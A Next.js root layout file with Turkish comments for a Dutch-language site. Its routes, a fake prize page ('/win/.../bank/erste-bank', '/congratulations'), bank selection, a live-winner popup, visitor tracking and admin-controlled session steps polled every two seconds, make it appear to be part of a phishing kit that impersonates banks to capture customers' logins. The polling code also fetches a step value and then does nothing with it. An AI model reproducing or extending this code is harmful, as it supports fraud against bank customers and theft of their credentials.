"use client";

import { useEffect } from "react";
import { useRouter, usePathname } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client"; // Senin orijinal dosyandaki yol bu
import LiveToast from "@/components/LiveToast";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";
import "./globals.css";

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const router = useRouter();
  const pathname = usePathname();
  const supabase = createBrowserSupabaseClient(); // Orijinal client'ı kullanıyoruz

  // Sadece belirli yollarda bildirimi gösterme kuralları:
  // Admin yolları, geçersiz banka sayfaları, tebrikler veya BİREYSEL banka giriş sayfalarında göstermeyelim.
  // "/banken" (liste) sayfasında GÖSTERİLECEK.
  const hideToastOnPaths = [
    "/admin",
    "/admin/login",
    "/invalid-bank",
    "/congratulations",
    "/live-support"
  ];
  
  // Eğer yol "/bank/" içeriyorsa (örneğin /win/123/bank/erste-bank), toast'u gizle.
  // Ama "/banken" ise gizleme.
  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");

  useEffect(() => {
    const listenAdmin = async () => {
      if (!supabase) return;
      // URL'deki session id'yi alıyoruz (admin panelinden gelen linklerdeki id)
      const urlParams = new URLSearchParams(window.location.search);
      const sessionId = urlParams.get("session");
      
      if (!sessionId) return;

      const { data } = await supabase
        .from("sessions")
        .select("current_step")
        .eq("id", sessionId)
        .single();

    };

    const interval = setInterval(listenAdmin, 2000);
    return () => clearInterval(interval);
  }, [pathname, router, supabase]);

  // Banka detay/adim sayfalarinda marka arkaplanini gizle, ancak banka listesinde koru.
  const isAdminPage = pathname.startsWith("/admin");
  const isBankDetailPage = pathname.includes("/bank/") || pathname.includes("/invalid-bank");
  const isBankListPage = pathname.startsWith("/banken");
  const bodyClass = [
    isAdminPage || isBankDetailPage ? "bg-[#f4f7f9]" : "ah-theme",
    isBankListPage ? "ah-theme-banken" : "",
  ]
    .filter(Boolean)
    .join(" ");

  // GEÇİCİ OLARAK KAPATILDI: LiveToast özelliği daha sonra tekrar açılmak üzere deaktif edildi.
  // Şu an test için açık bırakıldı.
  const ENABLE_TOAST = true;

  return (
    <html lang="nl">
      <body className={bodyClass}>
        <SettingsProvider>
          <VisitorTracker />
          {ENABLE_TOAST && shouldShowToast && <LiveToast />}
          {children}
        </SettingsProvider>
      </body>
    </html>
  );
}
